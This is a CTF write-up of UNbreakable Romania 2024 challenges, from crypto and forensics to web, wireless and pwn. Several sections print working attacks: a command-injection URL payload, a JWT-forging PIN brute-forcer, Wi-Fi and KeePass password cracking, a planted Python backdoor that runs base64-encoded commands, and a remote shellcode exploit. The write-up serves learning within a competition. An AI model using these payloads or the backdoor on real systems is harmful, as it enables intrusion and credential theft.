# UNbreakable Romania 2024

Victor-Andrei Moșolea - mvictorandrei@gmail.com - vektor 

- [rfc-meta: Misc](#rfc-meta)
- [traffic-e: Cryptography](#traffic-e)
- [wifiland: Wireless](#wifiland)
- [wifibasic: Wireless](#wifibasic)
- [pygment: Web](#pygment)
- [something-happened: Threat hunting](#something-happened)
- [fake-add: Reverse Engineering](#fake-add)
- [improper-configuration: Mobile](#improper-configuration)
- [you-can-trust-me: Web](#you-can-trust-me)
- [easy-hide: Forensics](#easy-hide)
- [password-manager-is-a-must: Forensics](#password-manager-is-a-must)
- [persistent-reccon: OSINT](#persistent-reccon)
- [secrets-of-winter: Steganography](#secrets-of-winter)
- [privilege-not-included: Misc](#privilege-not-included)
- [start-enc: Cryptography](#start-enc)
- [safe-password: OSINT](#safe-password)
- [intro-to-assembly: Pwn](#intro-to-assembly)

## rfc-meta
### Flag proof
```CTF{5ba73b7f830badc3e9d32e85bcdcc172bc417afbabc92ea7a343bc3b79fd722e4c44c}```
### Summary
The C2 server communicates with it's client using the reason phrase from the HTTP response.
### Details
Inside the network tab when connecting to the given host we can see the redirects with status code 301 followed by a hex string.
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/9bc07f07-8460-4677-a1d1-cc7471a98a0d)
Concatenating all those hex strings and decoding the result outputs the flag
```bash
python3 -c "print(bytes.fromhex('4354467b3562613733623766383330626164633365396433326538356263646363313732626334313761666261626339326561376133343362633362373966643732326534633434637d'))"
b'CTF{5ba73b7f830badc3e9d32e85bcdcc172bc417afbabc92ea7a343bc3b79fd722e4c44c}'
```


## traffic-e
### Flag proof
```CTF{46b1d043b3d2d98a267455affce276c47a1f2bfb940881d1e9725c798373f532}```
### Summary
Get the TLS certificate from the PCAP file. The certificate uses RSA256 with a large e, thus vulnerable to Wiener attack. Use RsaCtfTool.py to solve for the private key and add it to the pcap to see the actual traffic.
### Details
First export the certificate and save it to a file of your choice.
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/dc1e1939-1805-4eb1-99da-cf884935eafa)
I saved it to `a.cert`
Use `openssl` to convert it to PEM format
```bash
openssl x509 -inform der -in a.cert -out a.pem
```
Extract `N` and `e` from the pem file and print them. I wrote this script to do this:
```python
from cryptography.hazmat.backends import default_backend
from cryptography import x509

cert = x509.load_pem_x509_certificate(open("a.pem", "rb").read(), default_backend())
public_key = cert.public_key()

print(public_key.public_numbers())
```

Use RsaCtfTool with Wiener attack (due to the high value of e it's probable to work) to extract the private component:
```bash
python3 /opt/tools/RsaCtfTool/RsaCtfTool.py -n 1300556443385702960287370880066951363059458853608419778980399106681258797515744867649068169234104827392051556571142405277681682030539978956790151962476764197038895389999034906026782855543935783433997596921912146618367339288840191094863590166756750397571840198677668908227545077721957613740525469652282292908679 -e 106645361573597107845396067866499068630105849159408665310862014583870062061704662230754284832387896920427209753236862548800746662398609212688373613186979102970308417884832531601035544107102590028211579550508699494971288803583755640940424098301425895738898909222425910339731329121362635050810847489912118168559 --attack wiener --private
```
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/f25e2f93-9931-4a85-a8f3-c81732a5c329)

Now we copy the private key to a file and import in wireshark
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/00ec4874-5e06-4e35-98b7-60db465e56f3)

And with the communication decoded we can look in the traffic and find our flag.
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/94411bb4-6a30-47ce-b743-f58aed8ec716)

```bash
python3 -c "print(bytes.fromhex('4354467b343662316430343362336432643938613236373435356166666365323736633437613166326266623934303838316431653937323563373938333733663533327d0a'))"
b'CTF{46b1d043b3d2d98a267455affce276c47a1f2bfb940881d1e9725c798373f532}\n'
```

## wifiland
### Flag proof
```CTF{b67842d03eadce036c5506f2b7b7bd25aaab4d1f0ec4b4f490f0cb19ccd45c70}```
### Summary
We are asked to find two ip's inside the encrypted traffic. We crack the SSID password with hashcat, we decrypt the traffic in wireshark and we look for ips.
### Details

We start off by converting the PCAP file into a format hashcat will understand 
```bash
hcxpcapngtool wifiland.cap -o crackme
```
Then we can use hashcat
```
hashcat -m 22000 crackme /usr/share/wordlists/rockyou.txt
```
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/33d4200b-2236-43e9-a445-f57b25dddf39)

We add the password in wireshark

![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/ad68d064-ff50-41df-b3f8-f002f1d2d6f5)

And we look at the traffic where we notice ARP traffic involving two addresses

![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/2e197b8e-1ed6-4c07-a17b-7e0ede8ecbc5)

With complete the two addresses inside the script and run it to get the flag
```python
from hashlib import sha256

ip_client = "10.0.3.19"
ip_target = "93.184.216.34"

def calculate_sha256(ip_client, ip_target):
    input_string = ip_client + ip_target
    hash_result = sha256(input_string.encode()).hexdigest()
    return hash_result

sha256_sum = calculate_sha256(ip_client, ip_target)
print('CTF{'+sha256_sum+'}')
```
And there we have it

![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/a248aae5-da2a-4a45-901b-85b22ab96ea3)

## wifibasic
### Flag proof
```CTF{73841584e4c011c940e91c76bf1c12a7a4850e4b3df0a27ba8a35388c316d468}```
### Summary
We use the same procedure as in wifiland to find the wireless password, and then we look inside the PCAP file for the other information.
### Details
Same as for wifiland we find the password and the SSID doing the following
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/12bafc5c-2e87-4e1f-b57c-589947d4445d)

We know that ESSID is the name of the network so we already have that and the password, we only need the BSSID which is a 48bit value

We filter for our target SSID in wireshark and we find our answer.
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/10997037-7ad0-41d4-8560-e5166a53893b)
Now we just complete the script and get the flag
```python

from hashlib import sha256

BSSID = "02:00:00:00:04:00"
ESSID = "TargetHiddenSSID"
PSK = "tinkerbell"

def calculate_sha256(bssid, essid, psk):
    input_string = bssid + essid + psk
    hash_result = sha256(input_string.encode()).hexdigest()
    return hash_result

sha256_sum = calculate_sha256(BSSID, ESSID, PSK)
print('CTF{'+sha256_sum+'}')
```

![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/ac5c226e-8170-47a9-a11e-9417e136d422)

## pygment
### Flag proof
```ctf{2ae4644b1e4cbc1f560c52f3ee0985043d3e0acf0f766851382974646578ec39}```
### Summary
Command injection in the highlight function.
### Details
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/01a8fa63-af80-445d-a340-ca597e05f71c)
When first opening the site we are greeted with an error trace. It complains about missing keys `a` and `b` so try them as query params

![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/6a8f1665-1257-4240-a1cb-681ad43c182c)
It looks like what we send will be used as parameters for the highlight function.

Dirsearch also reveals interesting information
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/f10c02cf-2b8c-4a40-99a3-3763a52a4b7e)
Accessing `/composer.lock` we can see exactly what libraries are installed.

![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/87bc8bcb-cb35-4963-8879-9d14744ab54c)
Leading us to this github [repo](https://github.com/dedalozzo/pygmentize.git) which has this [issue](https://github.com/dedalozzo/pygmentize/issues/1).
We try exactly that and after some attempts we manage to get the flag by accessing `/?a=&b=;cat flag.php; <<`

![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/e6e94201-6a1f-4bcb-a582-384ec9310872)

## something-happened
### Flag proof
```
1. Log4j
2. 198.71.247.91
```
Didn't manage to find the third answer.
### Summary
Search the kibana logs to answer the question.
### Details
We enter kibana and start searching. Upon noticing http traffic, we can filter to see only such trafic using `payload_data : *HTTP*` as filter.
Now looking through the request the following caught my eye.
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/4791eb38-b186-4f8b-80cc-dce189ab441b)
This helps us answer the first two questions `Log4j` `198.71.247.91`.
Unfortunately I was unable to find the third answer during the competition.
## fake-add
### Flag proof
```CTF{th1s_is_ju5T_ADD}```
### Summary
Reverse engineer the assembly instruction to compute the flag.
### Details
Looking at the decompiled ouput doesn't say anything. However, the assembly instructions is where the real thing happens.
We see that many values are loaded on the stack in local variables.

![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/3375b561-fb4d-42ce-9757-f841d2a58873)

Then pairs of consecutive values are added together.

![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/76ab7179-f699-4d88-9bbc-e138b17d4785)

We write a python script to do the computations and we get the flag.
```python
numbers = [0x3c,0x7,0x2a,0x2a,0x20,0x26,0x78,0x3,0x5a,0x1a,0x68,0x0,0x27,0xa,0x64,0xf,0x4b,0x14,0x5f,0xa,0x64,0xf,0x55,0xa,0x55,0x15,0x55,0x20,0x34,0x1,0x2a,0x2a,0x35,0x2a,0x21,0x20,0x21,0x23,0x21,0x23,0x64,0x19]
print(len(numbers))

res = ""
for i in range(0, len(numbers), 2):
    res += chr(numbers[i]+numbers[i+1])

print(res)
```
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/7554a0b0-e1f5-4f68-9889-446a818ecaec)

## improper-configuration
### Flag proof
```wlwkfwo2-3cscase-wdc```
### Summary
Reverse engineer apk with jadx-gui
### Details
Looking inside application we find this interesting string.
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/fe2cde10-cb9a-45f7-a26e-f071d2aa673d)
So we search explicitely for the first part in the whole app and find the flag to be the application name
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/a95d8c55-c316-4f87-8827-6a573fbe9909)

## you-can-trust-me
### Flag proof
```CTF{2965f7e9fcc77fff2bd869db984df8371845d6781edb382cc34536904207a53d}```
### Summary
Only JWT payload matters as it seems the signature is not checked, therefore we alter the payload to make ourselves admin then we are asked to provide other fields. We provide the fields and at last we need to bruteforce the last field's value to get the flag.
### Details
When first opening the application we are shown that our cookie doesn't have enough privileges.
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/9112f394-0394-4d8f-8525-deac317224c7)
Dirsearch reveals the existence of `/docs` endpoint
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/73c92058-12cc-45c0-bdb1-8b9d8d3242fe)
Inside the docs we find the following messagw
```Note to self: Admin tokens must have the is_admin key defined otherwise we will know that it is just a normal user.```
This means that we have to modify the payload to have the is_admin key. When doing that we are told we are missing the flag. So we add that field to the payload as well. After that we are missing the pin. After adding the pin as well we are told it is invalid and we are told as a hint the pin is 4 digits.

In order to bruteforce the pin I wrote this script:
```python
import base64
import requests

for i in range(9999, 0, -1):
    try:
        payload = base64.b64encode(b'{"user":"admin","is_admin":true,"flag":true,"pin":"' + f'{i:04d}'.encode() + b'"}').decode().replace("=", "")
        key = f"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.{payload}.PM4MrxXKjIlzEOdt3_IdDdtwdfGn3cQnFwR8oqVfh4Q"
        a = requests.get("http://34.89.210.219:32721/", cookies={"sessionKey": key})
        print
        if "pin is not valid" not in a.text:
            print(a.text, i)

        payload = base64.b64encode(b'{"user":"admin","is_admin":true,"flag":true,"pin":' + str(i).encode()+b'}').decode().replace("=", "")
        key = f"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.{payload}.PM4MrxXKjIlzEOdt3_IdDdtwdfGn3cQnFwR8oqVfh4Q"
        a = requests.get("http://34.89.210.219:32721/", cookies={"sessionKey": key})
        if "pin is not valid" not in a.text:
            print(a.text, i)
    except:
        print("to retry:", i)
```
The script attempts all 4 digits pins and sends them both as integers and as strings.

After a while the script is able to retrieve the flag.
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/a898ae1d-63f3-4919-ae92-35e73bbd32c6)


## easy-hide
### Flag proof
```UNR{sunIZZsunshine}```
### Summay
Binwalk the original file then fix the header of the resulting file.
### Details
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/8ea3a116-b065-4f53-9f2f-b82168ec50be)

Binwalk reveals another file called `strange-picture.jpg`. However it doesn't seem to be a jpg since it can't be opened. We try to fix it's magic bytes to try and open it as a jpg and it works, revealing the flag.
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/4d0fab4f-8784-4110-b03e-d5ea9014b242)
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/01dee118-1bed-44ae-be3a-d3faecd73214)

## password-manager-is-a-must
### Flag proof
```CTF{c112b162e0567cbc5ae20558511ab3932446a708bc40a97e88e3faac7c242423}```
### Summary
Use a tool dump part of the password from the memory dump then with hashcat find the rest.
### Details
We first look what type of files we have been given
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/182406e8-4836-430a-bd9f-40e61293b95f)
Seeing that we have a Keepass database we search online for password dumpers using the memory dump and we find this (repo)[https://github.com/vdohney/keepass-password-dumper].
We clone and run the project using
```bash
dotnet run ../File.DMP
```
And the output reveals most of the password
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/62931e65-1eea-4cc9-ae08-2a2dd1b80dd8)

Now we convert the database to a hash for hashcat to use

![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/ee509402-64db-4b14-89c9-a87ff58bd2a6)

Then we try to crack it using the known text `esecretpass` with a character in front.
```bash
hashcat -m 13400 hash_only -a 3 -1 ?l ?1esecretpass -O
```
This does not work so we prepend another character and we get the password.
```bash
hashcat -m 13400 hash_only -a 3 -1 ?l ?1esecretpass -O
```
We use the password `thesecretpass` to open the database and we retrieve the flag.
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/ecd8689b-52c4-43cb-80c8-fe2cc9459e1b)

## persistent-reccon
### Flag proof
```CTF{7e33e33a06c53d77330b9621a62fd4f1915e6e695f3188aba62c6800695ee30e}```
### Summary
Google a screenshot of the form to find the default credentials and log in to get the flag.
### Details
Taking a screenshot of the login page and searching it on google leads us to the following (documentation)[https://www.westermo.de/-/media/Files/User-guides/westermo_mg_6640-3202-lynx-xx00.pdf]

Inside the documentation we are told to use `admin:westermo` to login, which gives us the flag.
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/c3e09bef-3495-4e75-8648-dc33a464f93b)

## secrets-of-winter
### Flag proof
```ctf{g3t-3xiftool-to-f1ni$h-th3-ch4l1}```
### Summary
Exiftool reveals last half of the flag. Comparing the given image with the original reveals the first part.
### Details
In the exiftools output we can notice that the `Processing Software` and the `Artist` fields contain base64 encoded data. Those represent only part of our flag.

![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/7710f7b2-140b-41a5-8feb-6dd5c01fac94)

Using google image search I managed to retrieve the original photo. I used this (tool)[https://www.img2go.com/compare-image] to compare the two and this was the output.

![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/4439aecd-fe3d-4c1b-abea-160b3fb24107)

Using stegsolve we can play around with the color profiles to make the text easier to read. That text is the first part of the flag ```ctf{g3t-3xiftool-to-``` which tells us how to get the rest which we already did

## privilege-not-included

### Flag proof
```CTF{8cff7b8b13af53032ccc1e37317dbbe673046933df4954e9e4f126317934c64b}```
### Summary
Python library injection.
### Details
Inside the server we were given we can find in the `~` directory an include.py file containing
```python
from http.server import SimpleHTTPRequestHandler, HTTPServer
import include_php


def start_server():
    server_address = ("0.0.0.0", 1337)
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    include_php.file("/var/www/html/config.php",httpd)
    httpd.serve_forever()
    
if __name__ == "__main__":
    start_server()
```

There is however no include_php.py file on the system and no such package online.

We insert a dummy include_php.py file containing only
```python
def file(a,b): pass
```

After a while we notice that in the process list we can see the admin user running the include.py script from our own directory.
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/11aaaf1c-398d-45e4-9e61-80ebc111752a)
This must mean that the admin has some job set up to run that script but was unable to because it would error when trying to include the `include_php` file.

This means we can inject whatever python code we want. I modified `include_php.py` to contain:
```python
from http.server import BaseHTTPRequestHandler


class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(self.path.encode() + b" accesed by you")
        import os, base64
        self.wfile.write(os.popen(base64.b64decode(self.path[1:].encode()).decode()).read().encode())

def file(a, b):
    b.RequestHandlerClass = MyHandler
```
Esentially this code changes the request handler of the http server (b parameter in file function) with our own. `MyHandler` receives the reques and decodes the path with base64, executes the resulting bash command and replies with the output.

We make another script called `attack.py`
```python
import http.client
import sys
url = "localhost:1337/"
import base64
try:
    host, path = url.split('/', 1)
    conn = http.client.HTTPConnection(host)
    
    conn.request("GET", f'/{base64.b64encode(sys.argv[1].encode()).decode()}' + path)
    response = conn.getresponse()
    print("Response Status:", response.status)
    print("Response Data:", response.read().decode('utf-8'))  # assuming UTF-8 encoding
    
    conn.close()
except Exception as e:
    print("Error:", e)
```
Attack sends a base64 encoded command to the root endpoint using GET on the vulnerable server we created.

We save both files on the server with
```bash
echo "ZnJvbSBodHRwLnNlcnZlciBpbXBvcnQgQmFzZUhUVFBSZXF1ZXN0SGFuZGxlcgoKCmNsYXNzIE15SGFuZGxlcihCYXNlSFRUUFJlcXVlc3RIYW5kbGVyKToKICAgIGRlZiBkb19HRVQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkKICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICBzZWxmLndmaWxlLndyaXRlKHNlbGYucGF0aC5lbmNvZGUoKSArIGIiIGFjY2VzZWQgYnkgeW91IikKICAgICAgICBpbXBvcnQgb3MsIGJhc2U2NAogICAgICAgIHNlbGYud2ZpbGUud3JpdGUob3MucG9wZW4oYmFzZTY0LmI2NGRlY29kZShzZWxmLnBhdGhbMTpdLmVuY29kZSgpKS5kZWNvZGUoKSkucmVhZCgpLmVuY29kZSgpKQoKZGVmIGZpbGUoYSwgYik6CiAgICBiLlJlcXVlc3RIYW5kbGVyQ2xhc3MgPSBNeUhhbmRsZXI=" | base64 -d > include_php.py
```
```bash
echo "aW1wb3J0IGh0dHAuY2xpZW50CmltcG9ydCBzeXMKdXJsID0gImxvY2FsaG9zdDoxMzM3LyIKaW1wb3J0IGJhc2U2NAp0cnk6CiAgICBob3N0LCBwYXRoID0gdXJsLnNwbGl0KCcvJywgMSkKICAgIAogICAgY29ubiA9IGh0dHAuY2xpZW50LkhUVFBDb25uZWN0aW9uKGhvc3QpCiAgICAKICAgIGNvbm4ucmVxdWVzdCgiR0VUIiwgZicve2Jhc2U2NC5iNjRlbmNvZGUoc3lzLmFyZ3ZbMV0uZW5jb2RlKCkpLmRlY29kZSgpfScgKyBwYXRoKQogICAgCiAgICByZXNwb25zZSA9IGNvbm4uZ2V0cmVzcG9uc2UoKQogICAgCiAgICBwcmludCgiUmVzcG9uc2UgU3RhdHVzOiIsIHJlc3BvbnNlLnN0YXR1cykKICAgIHByaW50KCJSZXNwb25zZSBEYXRhOiIsIHJlc3BvbnNlLnJlYWQoKS5kZWNvZGUoJ3V0Zi04JykpICAjIGFzc3VtaW5nIFVURi04IGVuY29kaW5nCiAgICAKICAgIGNvbm4uY2xvc2UoKQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICBwcmludCgiRXJyb3I6IiwgZSkKCg==" | base64 -d > attack.py
```

We then wait for the admin to run the script and we can use attack.py to execute whatever command we need as admin.
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/f193c139-6562-4438-bbf3-d32a581bda62)


## start-enc
### Flag proof
```CTF{584b312bb5bb340e94085c43aba063c5b5a880391393baecf737d87246696cb7}```
### Summary
Use cyberchef to find the encodings for each step.
### Details
First it is obvious it is binary encoding. Then Cyberchef starts suggesting operations to add to its recipe and as we listen to it, it puts all pieces together to reveal the flag.
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/5fb23333-a296-4dce-9e8b-bd56bbc0c01b)

## safe-password
### Flag proof
```CTF{fdc852bc63a266c8c38db64bef90d62d53ddeef00aa85df7b941ac780b3d75d8}```
### Summary
Lookup all passwords in order to find the most pwned one.
### Details
Using the following script we can query a pwned passwords api to check our passwords. At first, it would't find anything, then I tried making everything lowercase and it finally found `Butterfly123@` as the most pwned. 
```python
import pwnedpasswords
import time
for line in open("leaked.txt", "r").readlines()[::-1]:
    print(line.strip())
    try:
        a = pwnedpasswords.check(line.strip().lower())
        print(a)
    except:
        print("could not check", line.strip())
    time.sleep(1)
```
## intro-to-assembly
### Flag proof
```CTF{926e420eeeeb6ac4890ddd46af5462d922e01307ef77d97d6799b167ed17e44f}```
### Summary
Write as short assembly code as possible to call the win function with the correct parameters.
### Details
First let's analyze the binary.
In main we see that we can provide 24 bytes of input which is then validated to not contain bytes 49, 15 and 5. If the check passes, our input is then executed.

![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/eda4883f-fa01-4a6f-8460-33ee7c465beb)

Another interesting function is the `win` function. When called with ("Hello", 1337, 0) as params it gives us a shell.
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/a4dc23e3-0f71-47c3-9810-e1310ebb5e1c)

So we need to write code in just 24 bytes to:
- set rdi to the address of "Hello"
- set rsi to 1337
- set rdx to 0
- call win
All this without using any disallowed byte.

Final script:
```python
from pwn import *

exe = ELF("./intro-to-assembly")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("34.89.210.219",31843)

    return r

def main():
    r = conn()

    r.clean()
    # win_func = 0x004012bb
    payload = "mov edx, eax; mov rdi, 0x00402008; mov rsi, 1337; mov eax, 0x4012bb; call rax"
    payload = asm(payload)
    print(payload)
    print(len(payload))
    print("Sending")
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/4cb64d53-33f9-40fa-9dd4-6e8173e3914a)
